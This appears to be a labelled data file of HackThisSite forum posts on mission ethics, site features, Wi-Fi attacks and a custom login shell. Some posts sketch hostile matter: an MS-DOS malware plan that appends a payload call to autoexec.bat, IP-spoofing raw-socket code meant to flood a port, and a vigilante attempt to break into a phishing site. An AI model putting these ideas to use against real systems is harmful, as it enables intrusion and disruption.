3	1st realistic mission ethics?	"hi,  im still working on the basic missions, but i had a pick at the realistic missions out of curiosity (well, only the first mission so far) and felt a bit concerned about the scenario being played out.  here is the description on the first page after clicking on ""relistic missions"" from the home page... code:  select all uncle arnolds local band review your friend is being cheated out of hundreds of dollars. help him make things even again!  ok fair enough; someone is being cheated and wants to get even. however... from: heavymetalryan message: hey man, i need a big favour from you. remember that website i showed you once before? uncle arnolds band review page? well, a long time ago i made a $500 bet with a friend that my band would be at the top of the list by the end of the year. well, as you already know, two of my band members have died in a horrendous car accident... but this ass hole still insists that the bet is on! i know youre good with computers and stuff, so i was wondering, is there any way for you to hack this website and make my band on the top of the list? my band is raging inferno. thanks a lot, man! hmmmm...i dont see how the guy is being cheated.  he foolishly made a promise that he cant keep.  in fact, it seems now he is asking for help on how to cheat the other guy out of winning the bet.  so his band mates died and he could not win the bet; shit happens, but to now say that the other guy is an asshole for holding the guy to his promise seems a bit unfair just because the guy doesnt want to pay up. if im missing something to the story please do let me know. i understand that this is just an example for practice, but i am only talking about the ethics of the story describing the example and not the usefulness of the mission itself in terms of the technical insight to be gained."

0	Python code hacking	"okay, i would like to share a story, and ask for some advice. first off, let me start by saying i am using a laptop that has several things blocked (for one, the task manager. there is just a pop-up saying that it is disabled). okay, now, this laptop has no way of putting a password for my username. thus, i was scared that i might leave my laptop somewhere, someone could steal it, and could log in and see all my crap. that is a huge no no to me >>. anyways, i decided to fix this problem. this is what i did: 1) created a python script, which asks for a username and password. this username and password is hardcoded into the script 2) compiled the script into an exe, using py2exe 3) changed the shell of the system to the exe (shellpass.exe) [via the registry] 4) on system boot into any user, you are presented with a full screen asking for username and password this exe does the following: 1) ask for username 2) ask for password 3) if no match, try again two more times. on fail, system restart 4) if successful, start the explorer process (normal windows shell) 5) ctrl-alt-del is disabled, as is win+r (run) okay, here is my question: can you help me hack my script? i just want to know any vulnerabilities. obviously, i have added precautions against ctrl+c (keyboard interrupt) and ctrl+z (end of file). besides, if they did disable the script, they shouldnt be able to run any file anyways. and no just booting into linux or another os either. im not worried about that right now. perhaps a usb drive with an autorun? or is autorun handled by the explorer process? here is my code: code:  select all # log on script # replace the explorer shell with this script import msvcrt import os import sys import time cls = os.system(""cls"") class stdredirect():     def maskget(self, sign):         toreturn =          a = 0         while a != :             a = msvcrt.getch()             if ord(a) == 13:                 sys.stdout.write()                 break             if ord(a) == 8:                 sys.stdout.write(\b\x00\x00\b)                 try:                     toreturn = toreturn[:-1]                 except:                     pass             else:                 toreturn += a                 sys.stdout.write(sign)                 #print(ord(a))         return toreturn class login():          path = rc:\programs\explorer.exe # path to the custom explorer process     logbase = {                hondros:passwordhere               }     logged = false     invalid = false     tries = 0     strtable = {         00:""welcome to the system"",         01:""username: "",         02:""password: "",         0f:""invalid username or password"",         10:""log in"",         ff:""log-in attempt tries exceededrestarting computer""         }     def startexp(self):         os.system(start +self.path)     def log(self, user, passw):         self.logged = false         self.invalid = false         try:             if self.logbase[user] == passw:                 self.logged = true             else:                 self.logged = false         except:             self.logged = false             self.invalid = true     def get(self, prompt, block=0):         if block != 1:             while true:                 try:                     g = raw_input(prompt)                     break                 except keyboardinterrupt:                     print()                 except eoferror:                     print()                 except:                     print()             return g         if block == 1:             sys.stdout.write(prompt)             g = stdredirect().maskget(*)             return g     def __init__(self, restart=0):         if restart == 0: restart = none         os.system(title  + self.strtable[10])         while ((self.logged == false) and (restart != self.tries)):             eval(cls)             user = self.get(self.strtable[01])             passw = self.get(self.strtable[02], 1)             self.log(user, passw)             if (self.logged == false) or (self.invalid == true):                 eval(cls)                 print(self.strtable[0f])                 self.tries += 1             elif (self.logged == true):                 eval(cls)                 print(self.strtable[00]+ %s %(user))                 time.sleep(1)                 self.user = user                 self.passw = passw                 self.startexp()         if ((self.logged == false) and (self.tries == restart)):             eval(cls)             print(self.strtable[ff])             os.system(""shutdown -s -t 2"") li = login(3)"
3	HellBoundHackers ?? NO NO NO!	"i was wondering, do any of you go on hbh? and do any of you respect your privacy? if the answer is yes, do not join it, cancel your membership, and try to avoid it as much as possible. i thought the reason behind a ""hacking community"" is too be able to speak, learn, have fun,  be safe ! i was once a member of hbh, now sadly i am not, i got banned, and do you want to know the reason: i got banned for a number of reasons, 1. i broke some forum rules, and therefore got punished with warn level 2. the limit of warn level is 100, and then you get banned, i had 50! 3. i sometimes posted indecent things, a little swearing, i made a ""what guestbooks to hack"" thread, which i understand is sad.  4. i was learning, and i was trying my hardest to fit in with the other members, i was obedient, and very apologetic. (* i am very sorry to have to say that once me and my mate had a disagreement, and i sent him a racist email about his black girlfriend, this was a while ago, i am sorry for it, and i really hate racists.*) and a member on hbh, called skunfoot, hacked my bebo, msn, facebook, myspace, practically everything, and posted pictures of me and my girlfriend on hbh! he then quoted from that racist email, changed my title to ""racistskiddie"" and futility another member deleted by account. and i can never go on it ever again! i didnt understand why i was banned, i mean it isnt my fault someone hacked my msn, and displayed its contents on hbh, is it? i am really sorry, and they are idiots, who will not help you, they are arrogant, and they are bullies, in there own right, they are good hackers, but when they abuse there authority like that?! sorry for the article, thought you all should know, and please stay away. i bet some of you will blame me, and i will listen to whatever you have to say, help me not make the same mistake here... thanks"
3	Your HackThisSite:  HTSv5 Suggestions!	"hi everyone. you may or may not be aware that hackthissite has been planning a full site recode for quite some time. the new version of the site will be  htsv5 . itll feature a brand-new design, new missions (and updates for the existing missions) and a generally more modern feel to the site, which is starting to feel a little dated. also, all those problems with logging in, registering, etc - they should be gone. however, we need ideas! every suggestion in this thread will be discussed by me, kage and the other developers. here are the features that i would like to appear in htsv5. they havent been discussed yet, theyre just my personal opinions. feedback from you lot would be much appreciated as well take this into account.  video tutorial system (this is definitely on the way, but maybe not in time for htsv5 - not certain)  use of ajax. say what you will about it, it makes for faster and more slick navigation. it shouldnt be used for everything, but some things are much nicer with it.  ajax chat. not only can this be used potentially as a replacement for the hts message centre, it could also be implemented as part of the missions. (see description below**).  knowledge or information bank for specified topics, such as sql injection, tcp/ip, etc. potentially a wiki-style thing. would need to be discussed but itd be slightly different to the article system (or even a replacement for it).  code snippet section for hosting of cool scripts, apps, etc. exploit information too (when found by the user, not just reposted from another site) - encouraging security research to be posted to hts instead of other sites.  better system for filing bugs, submitting ideas, etc. regular polls on the homepage.  mission logs that let you save progress. so, say you find a particularly significant url, then this would be recorded in your mission log. of course, it would have be done properly so it didnt give things away. **ajax chat as part of the missions would be used to give you certain bits of information as you go along. this would create a more interactive feel. for example, when you first start a realistic mission, the url and brief description of the goal is sent to you by ""another user"" on hts. of course, that user wouldnt really exist. but itd seem it. ajax chat would  not  be a replacement for irc, please note. so then, those are my suggestions. please discuss them and add your own. the contents of this thread  will  be taken into account. got some ideas for the interface/design.. do some sketches and post them here, or pm them to me. alternatively, email  dotty@hackthissite.org  with any suggestions you may have. please observe the following: think your idea through before posting make your post legible (punctuation, spelling, spacing, etc.) be as detailed as you feel necessary stay on topic (this thread will fill up quickly)"
1	Looking for a mentor.	i am looking for a mentor. i am not a tech person by profession (i am an engineer/designer in construction) so i dont have a solid foundation. i want to desperately learn true hacking:not crime or script kiddie stuff. i know how to program autocad in lisp(and actually earned a living doing it for 2 years) and i am teaching myself c++. i listen to whatever con audio is available and google has become my best friend, but i feel like its just not enough. i am not a troll but i understand if ridicule or distrust is shown towards this post. i would greatly appreciate direction. i really enjoy the site. currently i am trying to code a c++ program to solve programming mission 1.
1	WiFi anonymity? am i missing something?	so ive been reading a lot on wifi penetration. ive slowly progressed and actually preformed my first hack on my own wifi router and continue to practice by changing settings and hacking it every time i want access to the internet. as most of the relevant books ive found are from the perspective of a pen tester they tend to skip or breeze over the aspects concerning anonymity. left with this gap in understanding ive tried to research the concepts of  802.11 policy with no avail. but to get to the point... thus far the only thing i know of that would track back to a hacker who hacked a router is the mac address which can easily be spoofed. this cant be the only identifiable information a hacked router has. am i missing something????
1	Wondering How Do They Do It?	hey, i was really curious, and i thought id ask, how do you get a users password for any website? now as some of you may know i am off hbh, and basically one member found out my passwords for everything! i had on facebook, myspace, bebo, hotmail everything..., and i was wondering how he did it? so i can protect myself from it, and i know i have to be really careful here, because i dont want to sound like some skiddy, who wants to know how to steal a friends password! because i dont! and nor do i want to be hit with the disclaimer on illegal actions, because im trying to avoid that, obviously...im merely curious, and i was wondering if it was like this how he done it: when i became a member on the website, in order for the website to create my user and password and store it in there db, did the member hack  that  website? and did he get my information from the databse. i really have no idea, and so this might sound like a childs dream... and so can i defend myself from that, i mean, it sounds like i cant because i need them to store my info for my user to survive? moderator: if this is breaking any rules, please lock this thread now! i am not sure if it or not, i tried to be as clean as possible? sorry guys if this seems skiddie, im merely asking how to do it...  thanks

3	unbricked my phone :)	i have a samsung galaxy s 2 that i used to use. i bought another phone about a year ago and decided to try and install a custom system on my old one since it was getting kind of slow (never occurred to me that storing 2000 text messages and 2 years of useless logs could contribute to that) so i installed clockwork mod recovery, rooted it and attempted to install a new rom. as per usual form, i didnt really read the instructions and bricked it. i found my microsd card recently and decided to have another crack at getting my phone to work. after dealing with my raspberri pi in the past few months, ive accepted that linux and sd cards dont mix for some reason and i need to boot up windows in order to do stuff with them, and on the hunch that the files didnt copy properly last time, i downloaded cyanogenmod and copied it over in windows. i now have a working phone but ive noticed that cyanogenmod doesnt seem to have an app market place or any google or samsung proprietary apps. does anyone here so i just got my phone working    next time you have a problem you cant figure out and need help, start a post and begin documenting what you have done, why you have done it, and what you want to accomplish and see if the problem solves itself

3	Just unbelievable	luckily im an it admin and have access to lots of resources, dmz servers, outside facing exchange servers and the like. as im growing with this pen testing track my curiosity takes over.  i asked the powers that be if i could play around with the network to test its security and was given free roam to do what i wanted. trusted with this responsibility i didnt want to take too much for granted.  last night i ran an nmap scan on one of our external ips. os detection also threw up some info i wouldnt have expected to see. i ran metasploit against the host and i was really surprised (after a few bits of trial and error) to see that i was able to deliver a payload to the server quite easily. this is a server 2012 box too. some owa exploit that had the date of 2014 on it. i didnt get too much into it after that and quit out of it all.  i come in the next day and let my it manager know about it and apparently its nothing to worry about because who is going to be rooting about our exchange server out of everything on the net?  i got the impression i upset the apple cart a bit and made him look silly. cant go over his head with it, but to me its only a matter of time before its noticed by someone.  what would you do?
1	Hiding & Editing MS-DOS files	"hi. im making a peice of malware for ms-dos on a virtual machine. just for a bit of fun, i guess. anyway, i have a basic idea for my malware: ill have a floppy disk with 2 files on it, a hidden payload file and a setup file. when they run the setup file, itll echo ""bad command or file name"" to make it seem like its bugged or something. in reality, itll have edited autoexec.bat and added call a:\payload.bat onto it. basically, what im asking is: is there any way to make a file hide itself without being run? and how would i make a file edit another file? thanks for any help."

1	Cant find the mssttm.dll, please help	recently, meaning today at around  11am i had a alert from my avg virus protector or whatever you would like to call, it said that the file mssttm.dll was missing, from that point on everytime i tried opening a file it would tell me that it would close or be unable to work,this though wasnt the case infact it only said it didnt work but believe it or not the program actually did open, after growing alittle suspicious that my avg may have called that program a virus under false accusations i look at what the file was infected with and it said it was infected with a trojan thinking this may also be have been a program that was not truly infected i let it go back into the wilderness of my computer, lo and behold the problem arose again and i got the message that not only was the file infected now but 7 other files were infected the funny part of that was that all the files that were infected were all the programs i had opened at that time. from that point i just let it sit still in my virus fault, and now i write this message through my inferior desktop computer since it is not infected. the reason i do ask for the file mssttm.dll is because it doesnt seem to exist? if that makes any sense ive searched for the file online through the various free .dll file websites and then i searched through this website either the file is merely jsut another virus that make my computer register something that isnt there or is it something easily fixable and im looking in the wrong places? also note the place that the file is suppose to be located in mssttm.dll is noted as system32 but when i looked there, i saw no such file. if anyone can help i would much appreciate it.
3	Bruce Schneier quote	"hi. so, when i loaded hackthissite, i saw the random quote, this one by bruce schneier. he says ""if you think technology can solve your security problems, then you dont understand the problem and you dont understand the technology."" first off, i disagree with that. i do actually believe tech  can  solve our security problems, or at least attempt to. nothing is perfect, but we do our best. what exactly ""is"" the problem? privacy? code weaknesses? whatever the problem, i think it can be solved. every problem has a solution. i saw a quote from microsoft saying that when humans and machines work together, anything is possible. i stand by that belief myself    just my two cents"

1	Hack a website/someone using his IP	"hey, ive been receiving a link several times from one of my msn contact. i knew this was a virus or something like that but tonight i got annoyed and i clicked on it to see where it goes. so i found that it was a webpage used to steal email accounts. theres a form in the page and you have to enter your email/password to ""login"" to the fake page. anyways, i managed to get the ip of the guy... but im stuck here. ive completed several missions in hts but none talks about ip. so i would like to know what can i do with it? i know you wont be able to explain  it to me in a single forum post but if you have a website that explains how to, itd be nice.  can i post the url here? im not sure... i dont wanna break the rules of the forum. ill post it and if im not supposed to just tell me ill remove the url -removed-"

1	Unknown encryption	hello, i hope i hit the right forum, sorry if i didnt (-; anyways, i am looking for help on finding out password encryption algorythm. i am playing with one closed system and i feel that password sub-system is quite weak. the tests show that: a) encrypted passwords can be decrypted, so this is not one-way hash like md5/sh1/etc; b) it has some sort of random number inside that makes different encrypted sctrings for the same password each time you generate it; c) all password letters can be split by pairs; d) there is lenght(string)+1 pair in the encrypted string.. e) .. which leads us to think that one of pairs might be that random number, which then helps to decode all leters; some generated passwords: a => qmrq aa => kjhfhi  aaaa => jjifiiihik aaaaa => kdhhhkhjhmhl aaaaaa => ihjdjgjfjijhjk aaaaaa => rqqmqlqoqnqqqp aaaaaa => sqpmplpopnpqpp aaaaaa => jmiqipisirfefd  aaaaaa => egfkfjfmflfofn  aaaaaaaa => jnirfefdfgfffifhfk aaaaaaaaa => jdihikijimilioiniqip i am not very good at cryptography or programming, so if you got skillz - feel free to test them (-; thanks in advance!
3	"What is ""Choice"""	"so heres the question : what is ""choice""        here is a chat me and d0nut had ps: d0nut my irc chat doesnt work for some reason trying to fix it now   code:  select all  <swift> ive got a philosophical question if any one is up to it? <d0nut> go for it <swift> what is choice? <d0nut> a decision to be man <d0nut> s/man/made/ <swift> ok now do we have choice? <d0nut> depends on which aspect of what you are talking about having a choice in <swift> could youelaborate <d0nut> thats actually what i was trying to say <d0nut> what are you talking about having a choice in? <swift> my point is that you have no choice in any matter <d0nut> but to do what is already supposed to happen? <d0nut> have you been watching the matrix? <swift> for instance if i say choose between red and blue i am forcing you to choose their for you have no choice <d0nut> oh <d0nut> then you have no choice but to choose red or blue? <d0nut> assuming they are the same thing then no you dont <d0nut> or if you hadnt considered just walking away <swift> true but then in every plain two option question like choose red or blue you would have 4 options <swift> well 3 actually 1: answer red, 2: answer blue, 3: dont answer <d0nut> but then how does that mean you dont have a choice? <swift> but still being forced to choose one of those options <d0nut> hrmm... <d0nut> i dont see how thats not a choice <swift> choice is supposed to be a type of freewill how could you have freewill if you are forced to choose one of the options <d0nut> you could have just as easily decided not to talk to the person asking you the question <d0nut> walked down a different road and never seen them <d0nut> it could also be something as easy as you being delayed and walking down the road it would have happened on but the person asking the question wasnt there yet or had already left <swift> but then that goes into fate <d0nut> if you believe in fate, and thats a decision too <d0nut> so, in a way there is no escaping a choice, you are confronted with them no matter which way you may turn <d0nut> brb, bathroom <swift> not necessarily for my prior events in my life causes me to ""choose"" that i do or do not. since we were born we were taught from a child in what to belive by people surrounding us we had no ""choice"" in that. which causes us to belive in what we do now <swift> sure we can change what we belive in but no matter how hard you try what you were taught when you were a child stays with you <d0nut> hrmm <d0nut> but then its not a choice in the beginning <swift> unless you gain amnesia but then it happens all over again as if you were a child. the people surrounding you teaches what is right and what is wrong, and if those surrounding you all do the same then you have no choice or didnt know even would have such an option to disagree <swift> so how do you have choice? <swift> then what is it? <d0nut> then thats not a choice if an option is not available from the beginning <swift> but it is you just didnt know it right like you said you could have walked away <d0nut> not if you didnt know any better, or if you didnt have the option of walking away leaving behind your people/way of life <swift> accoriding to what you said earler you could always walk away <d0nut> well, not always, in the situation in my mind you could, but if you have no means of continuing your life after walking away then you couldnt <swift> how could you not continue your life? <swift> the only way i see a remotly way of haveing choice is this... <d0nut> well, in a theoretical situation, such as leaving a family that provides for you and/or you can provide yourself, then you couldnt just leave <swift> you could leave but in that case it would be stupid to do so... <swift> i think thats what your getting at <d0nut> well, if you never went back then you would die <swift> ok what would life be like if you were to wake up with amnesia with nothing to remember and every one was gone... then i think you would have choice... <d0nut> with no one/no past experiences to affect your judgement <swift> right <swift> but since no one has that you have no choice <d0nut> ...to do only what you would do, something extremely individual <d0nut> i see what you mean <swift> right <swift> thats my point <swift> so would you now agree we have no choice <d0nut> yes <swift> thank you very much for enlightening you <swift> :) <d0nut> lol <d0nut> i was about to say the same to you <d0nut> thank you very much for enlightening me <swift> your welcome lol <swift> i hope you have fun ""choosing"" the next time some one gives you a ""choice"" <d0nut> now, to continue, do you think instincts, instincts humans arent supposed to have would take over? <d0nut> kind of leaving philosophy <d0nut> :/ <swift> umm <swift> this is a good one... but then i would say that people who think that the one living organism that has ""choice"" in the matter would take over but then what does... <swift> maybe a one cell orgainsism but then do they have ""choice"" <swift> :} <swift> what do you think? <d0nut> it kind of makes me think that instinct or a human in ""primal mode"" is just a person making their own decisions <swift> true but then their parents taught them...no? <swift> then it would go to the first thing on this planet had to made its own ""choice"" right? but what is that? <d0nut> the bible says that eve was influenced to make the choice of eating the apple <d0nut> and adam followed suit <d0nut> another speculation would be that something experience something to make them not do whatever that was  <d0nut> say, if the first thing on earth hit its head <swift> *too what you written before* umm <swift> ""that something experience something to make them not do whatever that was say"" but then what would of said something to it... <d0nut> themselves <d0nut> to not want or to want to feel what they experienced <swift> ah i see what your saying i think so the first thing just happened to wonder say which space to sleep in this one or that one? <swift> something like that? <d0nut> sure <d0nut> like say if they stepped on something that hurt them, they wouldnt want to relive the experience <swift> but then too me i would think it would automaticlly sleep in the one that best suites it self therefor not giving it that choice <swift> ah <swift> which would cause them not to choose to step on it again i c <swift> but then back to your question what would have it been? since it was the first thing on earth <d0nut> thats why started with a bible reference <d0nut> the situation was already there <d0nut> but, im not sure what it would be <d0nut> creationists generally assume some superpowered entity creates man <swift> i didnt really read the bible so not too good of a reference xd umm didnt adam make eve eat the apple? <swift> that it does <d0nut> nah, it was a serpent that represented the devil <swift> o <swift> i learn something new lol thank you for that <d0nut> but evolustionists believe life started with basic life <swift> which was what bacteria <swift> or simpler <d0nut> not necesarily <swift> ... <d0nut> it would probably just be a cingle-celled organism that survived in the chemicals of earth <d0nut> survived in/on <swift> right <swift> but was there just one at one time or did two of them appear at the same time... <d0nut> i dont think there is any way to know exactly <swift> true true <d0nut> i would think multiple completely different organisms spawned in different corners of the world <swift> i would have to agree with that statement as well <d0nut> although it could also have been an organism that came from space <d0nut> although its very unlikely <swift> true but i was not wanting to bring that into a factor cause then its like where did that come from xd <d0nut> lol, good point <swift> :) <swift> so many questions lol so little answers so tell me what you think about it or if you have your own ideas post em up"
1	MitM conceptual question	hello all, ive read some man in the middle tutorials and demonstrations. ive never done it, though. as far as i know, its easy to execute a a mitm attack on a client connected to an open network. the attacker only has to create a honeypot with the same essid as the open network where the client is connected. he may need to overlap the original network. for that purpose, the client has to receive higher signal from the fake network than the original one. then, the client is going to connect to the honeypot and hes going to be attacked by a mitm attack. my question is: in a wep/wpa/wpa2...lets imagine a wpa2 network, which is protected by a password authentication. the attacker has to create a honeypot whith the same essid and also set the same password as the original network, right? otherwise the client, who will try to connect automatically with the stored password, wont be able to connect to the network, because the passwords wont match. in the case the fake network has different encryption configuracion from the original(like wep, or open authentication), the client will not be able to match the original data remembered with the fake network, even if both have the same essid and bssid. so, in order to do a mitm attack againts a client connected to a wep/wpa/wpa2 you have to crack the password before. is that correct? thaaaank you! this is my first post, by the way grin.

1	Need help , my site got hacked  (by Kala$nikoV t34m)	hi guys, im new here, and i really need your help, because my friends site has been hacked, and we dont know what should we do. well, actually we do one thing, asked web hosting provider , but they dont response anthying (untill the day i write this). the hacker claimed them self by kala$nikov t34m. we really dont know anything about them or maybe someone just provoke us to them. well we dont know and thats not the main concern right know  our site has been hacked like this site  ( i use google to search who is kala$nikov t34m , and for the gods sake there are so many site hacked by them )  http://domainedetabary.com/ im sorry that i dont give the actual site, because i havent asked to my friend about asking people in the internet about this. so, do u know how to get our site back ??  if u know guys, please be kind to us. thanx =)
3	Localhost Hacking Simulation (in Development)	hey guys, after spending some time running through some of the missions on this site, i decided to create a localhost hacking simulation. i like the realistic hacking missions, but the problem is that once you enter in the right info, you dont really get to see the results or expand further on anything. obviously thats because doing so would actually mess up the database for other users, so i thought it would be cool to have a more hands-on approach, where you could actually do a much more in-depth hacking simulation. a localhost solution allows you to infiltrate anything you want, or even ruin the database with any exposed sql injections (if you really wanted to). the simulation isnt ready yet. the simulated site has a few exploits can be found right now, but its far from complete. i also figured i would want to get approval from a staff member before posting a link if theres any concerns about what files are in there (after all, i suspect the people here are pretty security conscious). anyway, aside from that, i was just curious to know what everyones thoughts were or if anyone would actually use it (in case im just wasting my time). the mission requires knowledge of html, php, javascript, sql, and common sense. if i get really into it and do some creative design, perhaps some social networking against an ai bot or something. as of right now and the majority of the design, however, its strictly to find the exploits and obtain as much information as possible. the current mission is as follows: you recently managed to join an exclusive hacking team named cipherx. theyre well funded, and theyre offering rewards for exploiting their targets and acquiring information that can be used to expose corruption. youve decided to give it a shot. a high-profile journalist named alex norvin that works for a racist, corrupt media organization known as ox news has recently created an online site to store and transfer information secretly between his sources. at least, it was meant to be secret. through a little social networking, one of the members of cipherx was able to learn about the site and acquire the web address. youre not sure whats in there, but it seems like a good place to take a peek. you suspect that the webmaster of the site wasnt particularly security conscious; possibly because hes unskilled, or maybe he just doesnt care. either way, thats good news for you. any time you recover important information, post it to cipherx through the contact form below. you will be paid according to how valuable it is. information can include: email addresses, names of sources, messages that were exchanged between people, passwords, secret links, proof of access to administrative pages, and more. your bank account will be credited according to the value of your information.
1	Need help. Practicing the skills Ive learned here.	"i play world of warcraft which means, like any other player, i get a shit load of e-mails everyday saying something like, your getting banned for trading accounts go to  http://www.worldofwarcraft.freehosting.net  and login to verify your account. and it takes you to a crappy wow phishing site that asks you to login. so today i got one a little more origional, from:	 ""donotreply@blizzard.com"" <donotreply@blizzard.com> ... add to contacts to:	************@yahoo.com	 dear customer, we are emailing you to let you know that we have had some game server nodes have software related failure (buggy kernel/updates) and hardware related failure. to know if your account was affected in anyway you should view our ""maintanence"" forum where we post all updates and issues that we may be experiencing. although this email may not involve your account, we are sending this out so everybody knows. [website removed for security reasons] -- goatboy if you have any questions feel free to contact us. thank you, blizzard inc support department notice the fake e-mailer they used to send it from @blizzard.com instead of  wowadmin@yahoo.com  thats not stupid. they misspelled maintenance though   and they didnt use some free host. so overall it was actually a bit impressive compared to most so i decided to check out the website and maybe hack it a bit. if you play wow and go to the website youll notice the site looks pretty believable. to some this may be the time they lose their account. anyways, im guessing the site is fairly new since it hasnt been logged as a phishing site yet. so i figured that i should practice what ive learned here to take down a phisher and help some people who are stupid and fall for this. so basically here is my problem, i cant get in to some of the directories, more specifically the one ive found the /images and /login (where i think the info is stored) i looked for a .htaccess file and a robots.txt and they didnt come up. i get this if i go to the directory directory listing denied this virtual directory does not allow contents to be listed. so how do i get in? the only ways ive seen anything like this are in .htaccess files and robots.txt so im at a loss. edit: the page says it posts the info to a login.php file. i think that file sends it to an e-mail address and if its his personal one i want to spam the shit out of him. so how do i read these hidden/blocked files/directories?"
1	Raw socket and a three-way handshake issue	"hi, im a new user, first time posting...     (well second time, originally posted this as a response to an old thread and it got sacked to graveyard, got a warning with it too). (sorry goatboy, i thought it was more convenient to post it as a follow-up... i guess not).   well, to cut the long story short, i have a seminar in computer security comming up. im writing a raw socket to establish the three-way handshake. i found an example of the code and decided to adjust it for my needs. after some tweaks (ip spoofing) i was able to send the syn packet to my server. my problem is that i cant, however, seem to get a syn/ack response from it.  a bit about the environment:  the socket program runs on a ubuntu 10.04 in a virtual machine (in virtualbox) and the server is apache on winxp, also in a virtual machine. they are networked internally and i hosted a small website on the server which i am able to access from a browser (three-way handshake succesful).  i have compared the packets info in wireshark. my syn packet is not much different from the one firefox uses. the main difference is that mine doesnt have sack permitted option enabled. should this matter?  the code: youll notice weird comments mostly in croatian, its my native language so dont get frightened or anything      wasnt exactly sure about all the includes needed, so there are probably a few extras unnecessary.  code:  select all #include<stdio.h> #include<stdlib.h> #include<time.h> #include<string.h> #include<sys/socket.h> #include<linux/if_packet.h> #include<linux/if_ether.h> #include<errno.h> #include<arpa/inet.h> #include<sys/ioctl.h> #include<net/if.h> #include<net/ethernet.h> #include<unistd.h> #include<netinet/in.h> #include<netinet/ip.h> #include<features.h> #define __favor_bsd #include<netinet/tcp.h> #define p 80        /* port koji cemo preplaviti */ unsigned short chksum (unsigned short *buff, int nwords)            /* funkcija za generiranje cheksume */ {     unsigned long sum;

3	Internet Kill-Switch	"a controversial bill handing president obama power over privately owned computer systems during a ""national cyberemergency,"" and prohibiting any review by the court system, will return this year. portions of the lieberman-collins bill, which was not uniformly well-received when it became public in june 2010, became even more restrictive when a senate committee approved a modified version on december 15. the full senate did not act on the measure. the revised version includes new language saying that the federal governments designation of vital internet or other computer systems ""shall not be subject to judicial review."" another addition expanded the definition of critical infrastructure to include ""provider of information technology,"" and a third authorized the submission of ""classified"" reports on security vulnerabilities. the idea of creating what some critics have called an internet ""kill switch"" that the president could flip in an emergency is not exactly new. a draft senate proposal that cnet obtained in august 2009 authorized the white house to ""declare a cybersecurity emergency,"" and another from sens. jay rockefeller (d-w.v.) and olympia snowe (r-maine) would have explicitly given the government the power to ""order the disconnection"" of certain networks or web sites. house democrats have taken a similar approach in their own proposals. lieberman, who recently announced he would not seek re-election in 2012, said last year that enactment of his bill needed to be a top congressional priority. ""for all of its user-friendly allure, the internet can also be a dangerous place with electronic pipelines that run directly into everything from our personal bank accounts to key infrastructure to government and industrial secrets,"" he said. woaw, a new language? i wanna see!!! a cyber-security emergency? anyone care to run some theories by me as of what could occur and how shutting off every ones internet would be the solution?"

3	I have been reading here a bit	"i have been a member for a while, but i have not been able to participate much because of offline activities and i have been in college for these past 4 years, about to start two more (hopefully the last two as i am becoming too old for this). but i have been reading and saw the 15 pages of comments regarding everything from updates, advertising, fan pages, and stuff like that. i think, and i know my opinion is probably not worth much, that you may want to change the way you do the challenges? maybe create a flash game for each individual and maybe a full game with all of them. in the game, instead of everyone asking for spoilers and all that junk, becuase even though almost everyone has posted the exact information of how to solve every single challenge on this site in more ways than one, there seems to be more people who feel it is not necessary to read anything not directly aimed at them, there could be some clues, not saying how to do something, but maybe a book laying around, a newspaper article on a computer screen that the player could click on that would give them the information they need, if only they learn what they are supposed to. maybe they have to interact with a few characters in the game that could give them knowledge that they have to decipher themselves.  i know developing that could take a heck of a long time, especially creating an overall story that can encompass all the missions, and developing the characters, backgrounds, how to give the user information that is not even technically the answer, voice overs, animation (which could be tweens much of the time), action script (which is actually much easier now), and putting it all together in the best way, meaning the best compression type for the web due to bandwidth issues. -- sat feb 12, 2011 12:51 am -- huh? i ran out of space. okay, beyond the games idea, there could be other things. how about starting a fan page challenge that could be like that one game ea had many years ago that i fail to remember or find through google, but basically you signed up, received an email, then had to look at the email via select all to see a hidden message telling you to go to whatever site and find the clue there. the game also incorporated phone calls.  the site could create a game such as this, using different fan pages, having to accomplish whatever challenges, and so on, and there really should be some incentive to play the game, such as win whatever.  the reason i say fan pages is becuase when you start facebook and you have an email list of a huge amount you can import it to facebook and have a huge friends list. then suggest the first page of the fan page game to all of them, those who play can share the fan page with others, and those can do the same, and so on.  this is basically viral game play. in any case, you can have hack this site banners all over these things, as well as affiliate banners for cpas or whatever that actually appeal to them.  this creates a higher hack this site fan base, and maybe a little extra cash. -- sat feb 12, 2011 1:02 am -- more space... . so anyway, i dont know much about the site due to the fact that i have actually only had the time to come here every once in a while and i am only up to like challenge 8 or something. but i do know online business a bit, fbml now, which is not really much to learn, just confusing without any real study material, the normal stuff everyone knows, html, php, css, javascript a bit, bit of ajax, simple stuff. no real programming experience outside of the boring java courses in college. two of them, both boring and quickly took care of those beginner programs to get them out of the way. not to say that java is boring, just the classes. same with c++. boring. in the end, i like the site, see that everyone is saying it has been a bit slow lately, but there are much more ways to get boosts than just articles. the problem lies in how many people want to do something about it. if the members themselves just are the type to go ""oh wow, learn to hack, oh wait, everyone help me pass the challenge, i dont want to learn if i have to read"" then you wont achieve much.  but if you round up the members that really have a passion for learning, and want to know every detail about everything, then you can find each of their skills, their expertise (because what geek with glasses, or cool guy who hides the fact that he is a math genius does not have some kind of expertise) and then really do something.  i myself have no expertise. i wanted to know it all, and i am constantly caught up in learning a bit about everything, until it gets boring, then go on, and come back later. so that explains why i know a lot about websites, but not site security that much."
2	Network Hacked [Speed reduced]	i am a student of college. in our college there is a wi-fi network which is encrypted with wpa password. now, most of the students know the password. in our college, nebero is used. nebero is a authentication panel used in various colleges and workplace. what happened that when we open browser it redirects us to nebero login panel where we can login and get the internet access. but some of us find that connection to https:// is possible without login and download speed can be increased without logging in.     now the problem is that someone had done something on the network and he has blocked all of us     from accessing the https:// connection directly and we cant increase the speed. so, i used wireshark and it shows router solication and neighbor solication. so, how to get rid of these. in our college cisco routers are used. i know there is ra guard but the wi-fi admin doesnt take our things seriously. so please help on this.
0	Intro to functional programming	"this is an intro to basic functional concepts, mostly iteration.  intro to functional programming (part 1) you’ve probably heard the term ‘functional programming’ thrown around a couple of times and you might even have an idea what it is. if you think c is a functional language odds are you should read this. languages like c are what they call a procedural language (aka imperative language). most procedural languages as well as most object oriented languages are generally statement driven and can trace their history to some form of machine code. while functional languages can trace their histories down to raw mathematics. functional programming in it’s most general sense is a special coding paradigm. much to the extent that procedural and object oriented programming are unto their own paradigms. meaning that in it’s most general sense you can apply functional programming practices to virtually any language much to the same aspect that you can apply object oriented concepts to procedural languages like c. it’s been written many times before me that “all serious programmers should learn a functional programming language” and i would have to agree. this is to the same extent that i would say that all serious programmers should also learn object oriented and procedural programming. i will admit that functional programming will probably be the most provocative of any of the lot. so wtf is functional programming so lets start by turning your world upside down and just throwing you to the lions right at the beginning. 